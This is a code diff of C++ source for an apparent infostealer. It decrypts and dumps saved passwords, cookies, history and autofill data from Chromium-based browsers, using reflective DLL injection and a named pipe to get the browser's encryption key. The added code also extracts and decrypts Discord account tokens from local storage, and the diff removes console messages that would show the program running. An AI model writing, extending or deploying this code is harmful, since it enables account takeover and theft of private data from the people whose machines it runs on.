-        if (fs::exists(data / "Side Profiles")) { for (const auto& e : fs::directory_iterator(data / "Side Profiles")) { if (e.is_directory()) profs.push_back("Side Profiles/" + e.path().filename().string()); } }
-        fs::path temp = fs::path(getenv("TEMP") ? getenv("TEMP") : ".") / ("browser_db_" + std::to_string(GetTickCount())); fs::create_directories(temp);
-        for (auto& p : profs) {
-            fs::path p_path = data / p; ProfileData p_data; p_data.name = p; std::string p_san = p; std::replace(p_san.begin(), p_san.end(), '/', '_'); std::replace(p_san.begin(), p_san.end(), '\\', '_'); std::replace(p_san.begin(), p_san.end(), ':', '_');
-            fs::path db = p_path / "Login Data", t_db = temp / (p_san + "_pass.tmp");
-            if (copy_db_with_sidecars(db, t_db)) {
-                sqlite3* sdb; if (open_db_for_extraction(wstring_to_utf8(t_db.wstring()), &sdb) == SQLITE_OK) {
-                    sqlite3_stmt* st; if (sqlite3_prepare_v2(sdb, "SELECT origin_url, username_value, password_value FROM logins", -1, &st, nullptr) == SQLITE_OK) {
-                        while (sqlite3_step(st) == SQLITE_ROW) { auto b = (const unsigned char*)sqlite3_column_blob(st, 2); int len = sqlite3_column_bytes(st, 2); if (b && len > 0) { auto d = decrypt_blob(std::vector<unsigned char>(b, b + len), v10, v20); if (!d.empty()) p_data.passwords.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1), to_utf8_lossy(d) }); } }
-                        sqlite3_finalize(st);
-                    }
-                    sqlite3_close(sdb);
-                }
-                cleanup_db_temp(t_db);
-            }
-            db = p_path / "Network/Cookies"; if (!fs::exists(db)) db = p_path / "Cookies"; t_db = temp / (p_san + "_cook.tmp");
-            if (copy_db_with_sidecars(db, t_db)) {
-                sqlite3* sdb; if (open_db_for_extraction(wstring_to_utf8(t_db.wstring()), &sdb) == SQLITE_OK) {
-                    sqlite3_stmt* st; if (sqlite3_prepare_v2(sdb, "SELECT host_key, name, path, expires_utc, is_secure, is_httponly, samesite, encrypted_value, value FROM cookies", -1, &st, nullptr) == SQLITE_OK) {
-                        while (sqlite3_step(st) == SQLITE_ROW) {
-                            auto b = (const unsigned char*)sqlite3_column_blob(st, 7); int len = sqlite3_column_bytes(st, 7); std::string val; if (b && len > 0) { auto d = decrypt_blob(std::vector<unsigned char>(b, b + len), v10, v20); if (!d.empty()) val = to_utf8_lossy(d); }
-                            if (val.empty()) val = get_sqlite_text(st, 8); if (!val.empty()) p_data.cookies.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1), val, get_sqlite_text(st, 2), sqlite3_column_int64(st, 3), sqlite3_column_int(st, 4), sqlite3_column_int(st, 5), sqlite3_column_int(st, 6) });
-                        }
-                        sqlite3_finalize(st);
-                    }
-                    sqlite3_close(sdb);
-                }
-                cleanup_db_temp(t_db);
-            }
-            db = p_path / "History"; t_db = temp / (p_san + "_hist.tmp"); if (copy_db_with_sidecars(db, t_db)) { sqlite3* sdb; if (open_db_for_extraction(wstring_to_utf8(t_db.wstring()), &sdb) == SQLITE_OK) { sqlite3_stmt* st; if (sqlite3_prepare_v2(sdb, "SELECT url, title, visit_count FROM urls LIMIT 500", -1, &st, nullptr) == SQLITE_OK) { while (sqlite3_step(st) == SQLITE_ROW) p_data.history.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1), sqlite3_column_int(st, 2) }); sqlite3_finalize(st); } sqlite3_close(sdb); } cleanup_db_temp(t_db); }
-            db = p_path / "Web Data"; t_db = temp / (p_san + "_web.tmp"); if (copy_db_with_sidecars(db, t_db)) { sqlite3* sdb; if (open_db_for_extraction(wstring_to_utf8(t_db.wstring()), &sdb) == SQLITE_OK) { sqlite3_stmt* st; if (sqlite3_prepare_v2(sdb, "SELECT name, value FROM autofill", -1, &st, nullptr) == SQLITE_OK) { while (sqlite3_step(st) == SQLITE_ROW) p_data.autofill.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1) }); sqlite3_finalize(st); } sqlite3_close(sdb); } cleanup_db_temp(t_db); }
-            fs::path b_dir = extractor_root / browser.name; fs::create_directories(b_dir, ec); fs::path p_dir = b_dir / p_san; fs::create_directories(p_dir, ec);
+    if (browser.use_injection) { h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 50 * 1024 * 1024, 50 * 1024 * 1024, 0, NULL); inject_dll_reflective(h_proc, dll); if (started) { ResumeThread(pi.hThread); Sleep(500); } }
+
+    std::vector<unsigned char> v10, v20;
+    { std::ifstream f(data / "Local State"); if (f) { json j = json::parse(f, nullptr, false); if (!j.is_discarded() && j.contains("os_crypt")) { auto b = base64_decode(j["os_crypt"]["encrypted_key"]); if (b.size() > 5) v10 = decrypt_dpapi(std::vector<unsigned char>(b.begin() + 5, b.end())); } } }
+    if (browser.use_injection && h_pipe != INVALID_HANDLE_VALUE) { if (ConnectNamedPipe(h_pipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) { unsigned char buf[1024]; DWORD r; if (ReadFile(h_pipe, buf, sizeof(buf), &r, NULL) && r > 0) v20.assign(buf, buf + r); } CloseHandle(h_pipe); }
+
+    fs::path temp = fs::path(getenv("TEMP") ? getenv("TEMP") : ".") / ("browser_db_" + std::to_string(GetTickCount())); fs::create_directories(temp, ec);
+    for (auto& p : profs) {
+        fs::path p_path = data / p; ProfileData p_data; p_data.name = p; std::string p_san = p; std::replace(p_san.begin(), p_san.end(), '/', '_'); std::replace(p_san.begin(), p_san.end(), '\\', '_'); std::replace(p_san.begin(), p_san.end(), ':', '_');
+        fs::path db = p_path / "Login Data", t_db = temp / (p_san + "_pass.tmp");
+        if (copy_db_with_sidecars(db, t_db)) { sqlite3* sdb; if (open_db_for_extraction(wstring_to_utf8(t_db.wstring()), &sdb) == SQLITE_OK) { sqlite3_stmt* st; if (sqlite3_prepare_v2(sdb, "SELECT origin_url, username_value, password_value FROM logins", -1, &st, nullptr) == SQLITE_OK) { while (sqlite3_step(st) == SQLITE_ROW) { auto b = (const unsigned char*)sqlite3_column_blob(st, 2); int len = sqlite3_column_bytes(st, 2); if (b && len > 0) { auto d = decrypt_blob(std::vector<unsigned char>(b, b + len), v10, v20); if (!d.empty()) p_data.passwords.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1), to_utf8_lossy(d) }); } } sqlite3_finalize(st); } sqlite3_close(sdb); } cleanup_db_temp(t_db); }
+        db = p_path / "Network/Cookies"; if (!fs::exists(db)) db = p_path / "Cookies"; t_db = temp / (p_san + "_cook.tmp");
+        if (copy_db_with_sidecars(db, t_db)) { sqlite3* sdb; if (open_db_for_extraction(wstring_to_utf8(t_db.wstring()), &sdb) == SQLITE_OK) { sqlite3_stmt* st; if (sqlite3_prepare_v2(sdb, "SELECT host_key, name, path, expires_utc, is_secure, is_httponly, samesite, encrypted_value, value FROM cookies", -1, &st, nullptr) == SQLITE_OK) { while (sqlite3_step(st) == SQLITE_ROW) { auto b = (const unsigned char*)sqlite3_column_blob(st, 7); int len = sqlite3_column_bytes(st, 7); std::string val; if (b && len > 0) { auto d = decrypt_blob(std::vector<unsigned char>(b, b + len), v10, v20); if (!d.empty()) val = to_utf8_lossy(d); } if (val.empty()) val = get_sqlite_text(st, 8); if (!val.empty()) p_data.cookies.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1), val, get_sqlite_text(st, 2), sqlite3_column_int64(st, 3), sqlite3_column_int(st, 4), sqlite3_column_int(st, 5), sqlite3_column_int(st, 6) }); } sqlite3_finalize(st); } sqlite3_close(sdb); } cleanup_db_temp(t_db); }
+        db = p_path / "History"; t_db = temp / (p_san + "_hist.tmp"); if (copy_db_with_sidecars(db, t_db)) { sqlite3* sdb; if (open_db_for_extraction(wstring_to_utf8(t_db.wstring()), &sdb) == SQLITE_OK) { sqlite3_stmt* st; if (sqlite3_prepare_v2(sdb, "SELECT url, title, visit_count FROM urls LIMIT 500", -1, &st, nullptr) == SQLITE_OK) { while (sqlite3_step(st) == SQLITE_ROW) p_data.history.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1), sqlite3_column_int(st, 2) }); sqlite3_finalize(st); } sqlite3_close(sdb); } cleanup_db_temp(t_db); }
+        db = p_path / "Web Data"; t_db = temp / (p_san + "_web.tmp"); if (copy_db_with_sidecars(db, t_db)) { sqlite3* sdb; if (open_db_for_extraction(wstring_to_utf8(t_db.wstring()), &sdb) == SQLITE_OK) { sqlite3_stmt* st; if (sqlite3_prepare_v2(sdb, "SELECT name, value FROM autofill", -1, &st, nullptr) == SQLITE_OK) { while (sqlite3_step(st) == SQLITE_ROW) p_data.autofill.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1) }); sqlite3_finalize(st); } sqlite3_close(sdb); } cleanup_db_temp(t_db); }
+
+        if (!p_data.passwords.empty() || !p_data.cookies.empty() || !p_data.history.empty() || !p_data.autofill.empty()) {
+            fs::path p_dir = base_browser_dir / p_san; fs::create_directories(p_dir, ec);
             try {
                 std::ofstream f_p(p_dir / "passwords.txt"); json j_p = json::array(); for (auto& i : p_data.passwords) { f_p << "URL: " << i.url << "\nUser: " << i.username << "\nPass: " << i.password << "\n\n"; j_p.push_back({{"url", ensure_utf8(i.url)}, {"username", ensure_utf8(i.username)}, {"password", ensure_utf8(i.password)}}); } f_p.close(); std::ofstream(p_dir / "passwords.json") << j_p.dump(4, ' ', false, nlohmann::json::error_handler_t::replace);
                 std::ofstream f_c(p_dir / "cookies.txt"); json j_c = json::array(); for (auto& i : p_data.cookies) {
@@ -634,22 +448,52 @@ void inject_and_collect(const std::vector<unsigned char>& dll, const BrowserConf
                 } f_c.close(); std::ofstream(p_dir / "cookies.json") << j_c.dump(4, ' ', false, nlohmann::json::error_handler_t::replace);
                 std::ofstream f_h(p_dir / "history.txt"); json j_h = json::array(); for (auto& h : p_data.history) { f_h << "URL: " << h.url << " | Title: " << h.title << " | Visits: " << h.visit_count << "\n"; j_h.push_back({{"url", ensure_utf8(h.url)}, {"title", ensure_utf8(h.title)}, {"visit_count", h.visit_count}}); } f_h.close(); std::ofstream(p_dir / "history.json") << j_h.dump(4, ' ', false, nlohmann::json::error_handler_t::replace);
                 std::ofstream f_a(p_dir / "autofill.txt"); json j_a = json::array(); for (auto& a : p_data.autofill) { f_a << "Name: " << a.name << " | Value: " << a.value << "\n"; j_a.push_back({{"name", ensure_utf8(a.name)}, {"value", ensure_utf8(a.value)}}); } f_a.close(); std::ofstream(p_dir / "autofill.json") << j_a.dump(4, ' ', false, nlohmann::json::error_handler_t::replace);
-                std::cout << "[+] Saved data for profile: " << p << std::endl;
             } catch (...) {}
         }
-        fs::remove_all(temp, ec);
     }
+    fs::remove_all(temp, ec);
     if (started) { TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); } else if (h_proc) CloseHandle(h_proc);
+}
+
+struct DiscordConfig { std::wstring name, folder_name; };
+const std::vector<DiscordConfig> DISCORDS = { {L"Discord", L"discord"}, {L"Discord Canary", L"discordcanary"}, {L"Discord PTB", L"discordptb"}, {L"Lightcord", L"Lightcord"} };
+
+void collect_discord(const DiscordConfig& cfg) {
+    wchar_t sz[MAX_PATH]; if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, sz) != S_OK) return;
+    fs::path data = fs::path(sz) / cfg.folder_name; if (!fs::exists(data)) return;
+    std::vector<unsigned char> key;
+    { std::ifstream f(data / "Local State"); if (f) { json j = json::parse(f, nullptr, false); if (!j.is_discarded() && j.contains("os_crypt")) { auto b = base64_decode(j["os_crypt"]["encrypted_key"]); if (b.size() > 5) key = decrypt_dpapi(std::vector<unsigned char>(b.begin() + 5, b.end())); } } }
+    std::vector<std::string> tokens; std::regex r_plain(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27,})"), r_mfa(R"(mfa\.[\w-]{84})"), r_enc(R"(dQw4w9WgXcQ:([^"]+))");
+    fs::path lvldb = data / "Local Storage/leveldb"; std::error_code ec;
+    if (fs::exists(lvldb)) {
+        for (const auto& entry : fs::directory_iterator(lvldb, ec)) {
+            if (entry.path().extension() == ".ldb" || entry.path().extension() == ".log") {
+                std::ifstream f(entry.path(), std::ios::binary); std::stringstream ss; ss << f.rdbuf(); std::string s = ss.str();
+                auto it = std::sregex_iterator(s.begin(), s.end(), r_plain); auto end = std::sregex_iterator(); while (it != end) { tokens.push_back(it->str()); ++it; }
+                it = std::sregex_iterator(s.begin(), s.end(), r_mfa); while (it != end) { tokens.push_back(it->str()); ++it; }
+                it = std::sregex_iterator(s.begin(), s.end(), r_enc); while (it != end) {
+                    if (!key.empty()) { auto b = base64_decode(it->str().substr(12)); auto d = aes_gcm_decrypt(key, b); if (!d.empty()) tokens.push_back(std::string(d.begin(), d.end())); }
+                    ++it;
+                }
+            }
+        }
+    }
+    std::sort(tokens.begin(), tokens.end()); tokens.erase(std::unique(tokens.begin(), tokens.end()), tokens.end());
+    if (!tokens.empty()) {
+        wchar_t exe_path_buf[MAX_PATH]; GetModuleFileNameW(NULL, exe_path_buf, MAX_PATH); fs::path extractor_root = fs::path(exe_path_buf).parent_path();
+        fs::path d_dir = extractor_root / "discord" / wstring_to_utf8(cfg.name); fs::create_directories(d_dir, ec);
+        std::ofstream f(d_dir / "tokens.txt"); for (auto& t : tokens) f << t << "\n";
+    }
 }
 
 int main(int argc, char* argv[]) {
     std::string choice = "all"; if (argc > 1) { std::string a1 = argv[1]; if (a1 == "-b" || a1 == "--browser") { if (argc > 2) choice = argv[2]; } }
     std::vector<unsigned char> dll; if (!EMBEDDED_DLL_BASE64.empty()) { dll = base64_decode(EMBEDDED_DLL_BASE64); } else { std::ifstream f("payload.dll", std::ios::binary); if (f) dll = std::vector<unsigned char>((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>()); }
-    if (dll.empty()) { std::cerr << "DLL not found" << std::endl; return 1; }
     for (const auto& c : BROWSERS) {
         std::string nl(c.name.begin(), c.name.end()); std::transform(nl.begin(), nl.end(), nl.begin(), ::tolower); nl.erase(std::remove(nl.begin(), nl.end(), ' '), nl.end());
         std::string cl = choice; std::transform(cl.begin(), cl.end(), cl.begin(), ::tolower); cl.erase(std::remove(cl.begin(), cl.end(), ' '), cl.end());
         if (cl == "all" || cl == nl) { if (c.is_firefox_based) collect_firefox(c); else inject_and_collect(dll, c); }
     }
+    if (choice == "all") { for (const auto& d : DISCORDS) collect_discord(d); }
     return 0;
 }
